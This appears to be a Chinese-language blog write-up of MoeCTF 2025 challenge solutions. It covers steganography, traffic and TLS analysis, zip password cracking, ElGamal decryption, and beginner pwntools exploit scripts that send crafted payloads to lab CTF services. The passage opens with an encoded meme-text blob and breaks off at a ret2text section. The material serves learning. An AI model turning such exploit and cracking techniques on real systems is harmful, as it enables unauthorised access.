撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。 给了一堆哈机密语\u0026hellip;\n哈基米语翻译\n？？这是‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬{‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography}？？？\n怪怪的。\n这字符串内容有提示，复制解密得到的fakeflag，⽤零宽隐写解密。\nmoectf{1b8956b9-a423-4101-a1bd-65be33682c82}\n捂住一只耳 一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音\nflag 形式以moectf{}包裹提交，忽略大小写\n听得我耳朵疼呀，用audacity分析：\n发现另外一声道的音频不一致，我们单独分离出来：\n解码：\n1 2 3 ..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. -. ..--.- -..- -.. ..- FLAGIS:HALF_RADIO_IN_XDU HALF_RADIO_IN_XDU Enchantment 哇多么好的附魔啊\n你把图片发了出去，但似乎附魔台上的文字有一些不对劲？\n注：请将最终结果按单词以_分离并包上moectf{}提交，忽略大小写\n“你把图片发了出去”\u0026hellip;OK我知道了，这作者把图片发出去了，涉及upload上传，给我把upload流量提取出来！！\n搜索指令：\n1 http.request.method == \u0026#34;POST\u0026#34; 导出为png图片：\n根据附魔台咒语的编码表去对应转译：now_you_have_mastered_enchanting\nmoectf{now_you_have_mastered_enchanting}\n这题挺有意思的，不愧是杂项啊，脑洞真的厉害啊。\nWebRepo 这都是什么稀奇古怪的格式！？\n扫完后发现：“Flag is not here, but I can give you a hint: Use binwalk.”\n用binwalk提取看看，很奇怪我的Kali和随波逐流工具的binwalk都提取不出来，试试010editor手工提取，这题我不会，复现别人WP，为什么别人可以提取我不能\n/(ㄒoㄒ)/~~\nmoectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}\nez_ssl zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。\n但与此同时，他的浏览器却悄悄上传了另一份文件。\n现在把他电脑的抓包记录给你，你能破解他的秘密吗？\n进一步查看发现是一个ssl.log的文件\n然后在 编辑-首选项-Protocols-TLS 处的 (Pre)-Master-Secret log filename 选择保存下来的 ssl.log，解密 SSL 流量后可以发现另一个上传文件的 HTTP 数据包，用上述方法提取到 flag.zip。\n解密完就看到ZIP：\n用ARCHPR进行7位纯数字密码爆破：\n密码：6921682。打开后给了一堆ook编码：\n1 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. 解码地址：Brainfuck/Text/Ook! obfuscator - deobfuscator. Decode and encode online.\nmoectf{upI0@d-l0G_TO-DeCrYPT_uploAD}\n万里挑一 要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案\n这题涉及明文攻击，这题我没做出来，考察脚本编写和明文爆破，用递归方式打开压缩包password.zip，获取密码，然后尝试解压lock.zip参考复现别人的python脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import zipfile import io # 保存密码的文件 output_file = \u0026#34;pass.txt\u0026#34; # 递归函数，用于处理嵌套zip def extract_passwords(zip_bytes, level=1): passwords = [] with zipfile.ZipFile(io.BytesIO(zip_bytes)) as z: for name in z.namelist(): if name.endswith(\u0026#34;.zip\u0026#34;): # 读取子zip文件的二进制内容 sub_zip_bytes = z.read(name) # 递归调用 passwords.extend(extract_passwords(sub_zip_bytes, level + 1)) elif name.endswith(\u0026#34;pwd.txt\u0026#34;): content = z.read(name).decode(\u0026#39;utf-8\u0026#39;).strip() # 提取密码部分 if \u0026#34;The password is:\u0026#34; in content: pwd = content.split(\u0026#34;The password is:\u0026#34;)[1].strip() passwords.append(pwd) return passwords # 主程序 if __name__ == \u0026#34;__main__\u0026#34;: all_passwords = [] with open(\u0026#34;password.zip\u0026#34;, \u0026#34;rb\u0026#34;) as f: zip_bytes = f.read() all_passwords = extract_passwords(zip_bytes) # 保存到文件 with open(output_file, \u0026#34;w\u0026#34;) as f: for pwd in all_passwords: f.write(pwd + \u0026#34;\\n\u0026#34;) print(f\u0026#34;已提取 {len(all_passwords)} 个密码到 {output_file}\u0026#34;) 爆破后得出密码是a296a5ec1385f394e8cb\n\u0026hellip;这题MISC太难了\u0026hellip;/(ㄒoㄒ)/~~[MoeCTF 2025]《Misc 万里挑一》题解——记录一道有趣的题目 | 酸枝论坛\nmoectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}\nez_png 这张平平无奇的图片里藏着一个小秘密。\n秘密不在颜色中，而在文件的骨骼里。\n注意：某些数据段的长短似乎不太协调。\n第一种方法（答案复现）\n题目已经有提示了，用010editor和TweakPNG工具分析看看吧：\n使用 TweakPNG 发现倒数第二个 IDAT 块没填满就创建了个新的 IDAT 块，且新的块长度很小。\n很明显这应该是人为非法注入的。\n使用 010 Editor 提取这个 IDAT 块的 data 部分，使用如下脚本解压。\n1 2 3 4 5 6 7 import binascii import zlib formatted_hex = \u0026#34;78 9C CB CD 4F 4D 2E 49 AB CE 30 74 49 71 CD 8B 0F 30 89 CC F1 4F 74 89 F7 F4 D3 F5 4C 31 09 A9 05 00 A8 D0 0A 5F\u0026#34; compressed_hex = formatted_hex.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) compressed_data = binascii.unhexlify(compressed_hex) depressed_data = zlib.decompress(compressed_data) print(\u0026#34;Decompressed Data:\u0026#34;, depressed_data.decode()) 第二种办法就是binwalk提取，我一开始试了一试，没想到真出来了，我还以为是非预期解呢。\nmoectf{h1DdEn_P4YlOaD_IN-Id4T}\n我的杂项就只会这么多了，剩下的我是真不会了，转PWN了太久没搞杂项了有点生疏了。\n密码学 crypto_in_ctfru_men_zhi_bei_-moectf2025.pdf\n这是密码学的签到题，请阅读密码学入门指北，开启密码学的旅途吧！\n直接给官方WP版本的脚本吧，太简单了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from Crypto.Util.number import long_to_bytes p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863 c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863 c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983 x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214 # 解密计算 s = pow(c1, x, p) # 计算共享秘密 s_inv = pow(s, -1, p) # 计算s的模逆 m = (c2 * s_inv) % p # 计算明文 # 转换为字节并输出 flag = long_to_bytes(m) print(flag.decode()) 根据提供的 ElGamal 加密参数和解密过程，直接计算即可得到 flag。以下是计算结果：\n通过执行解密步骤：\n计算共享秘密 s = pow(c1, x, p) 计算明文 m = (c2 * pow(s, -1, p)) % p 将 m 转换为字节流 最终得到的 flag 为：\nmoectf{th1s_1s_y0ur_f1rst_ElG@m@l}\n二进制漏洞审计 pwn_tutorial.pdf\n二进制漏洞审计入门指北 这里是 MoeCTF 2025 Pwn。在真正开始 Pwn 之前，我们先来实操一下 Pwntools。\n第一个附件是 Pwn 入门指北，有较完整的 Pwn 入门学习路线和 Pwn 环境配置方法。\n第二个附件是本题程序，连接远程环境后就能与它交互。请在自己的电脑上配置好 Pwn 环境然后尝试运行下面的解题脚本获取 flag。（还需要一些修改）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * # 导入 pwntools。 context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 一些基本的配置。 # 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。 # io = process(\u0026#39;./pwn\u0026#39;) # 在本地运行程序。 # gdb.attach(io) # 启动 GDB io = connect(???, ???) # 与在线环境交互。 io.sendline(b\u0026#39;114511\u0026#39;) # 什么时候用 send 什么时候用 sendline？ payload = p32(0xdeadbeef) # p32(0xdeadbeef)、b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;、b\u0026#34;deadbeef\u0026#34; 有什么区别？ # 你看懂原程序这里的检查逻辑了吗？ payload += b\u0026#39;shuijiangui\u0026#39; # strcmp io.sendafter(b\u0026#39;password.\u0026#39;, payload) # 发送！通过所有的检查。 io.interactive() # 手动接收 flag。 直接套这个exp就好，改下IP和端口号：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * # 导入 pwntools。 context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 一些基本的配置。 # 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。 # io = process(\u0026#39;./pwn\u0026#39;) # 在本地运行程序。 # gdb.attach(io) # 启动 GDB io = connect(\u0026#34;192.168.149.1\u0026#34;, 6280) # 与在线环境交互。 io.sendline(b\u0026#39;114511\u0026#39;) # 什么时候用 send 什么时候用 sendline？ payload = p32(0xdeadbeef) # p32(0xdeadbeef)、b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;、b\u0026#34;deadbeef\u0026#34; 有什么区别？ # 你看懂原程序这里的检查逻辑了吗？ payload += b\u0026#39;shuijiangui\u0026#39; # strcmp io.sendafter(b\u0026#39;password.\u0026#39;, payload) # 发送！通过所有的检查。 io.interactive() # 手动接收 flag。 类似这样的结果：\nflag是动态的请不要乱套我这个噢(*^_^*)\n1 ez_u64 字节流是一种常见的数据表示形式，用于存储、传输和处理各种类型的数据。我们不妨试试用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。\n和入门指北题一样，这也是一道 Pwntools 练习题。只是这次轮到你自己来写脚本了。\nIDA分析函数：\nwrite函数将num真实值打印出来，然后就需要接收，再通过scanf返回给程序，（v1==num）比较正确就能执行后门函数。\nexp：\n1 2 3 4 5 6 7 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;192.168.149.1\u0026#39;,46404) io.recvuntil(\u0026#39;hint.\u0026#39;) payload = u64(io.recv(8).ljust(8, b\u0026#39;\\x00\u0026#39;)) io.sendlineafter(\u0026#39;\u0026gt;\u0026#39;,str(payload)) io.interactive() 这个payload = u64(io.recv(8).ljust(8, b\u0026rsquo;\\x00\u0026rsquo;))，我加了ljust比较严谨一点，日后这是一个好习惯(*^_^*)!!!\n1 find it fd(文件描述符)是什么？希望你能在本题中了解fd有什么用，又是如何分配的。\n初始fd：0，1，2分配给了stdin,stdout,stderr。新的stdout从3开始分配。open flag后，由于关闭了1，flag会被分配到1。依次输入3,./flag,1即可。\n2 EZtext 劫持程序的执行流是我们在 Pwn 中经常要做的事情，首先你需要了解一下程序的调用栈的结构，然后理解为什么我们能通过栈上缓冲区溢出来劫持控制流。再次强推我们写的 Pwn 入门指北好吗！把指北都读一遍，你会了解不少东西以及在这道题要踩的一个经典的坑。\nROP 是 Pwn 中使用频率非常高的一个利用手段，而本题 ret2text 正是典型的 ROP，看一看 CTFWiki 和入门指北（入门指北中有 ret2text 实例），然后开启你的 ROP 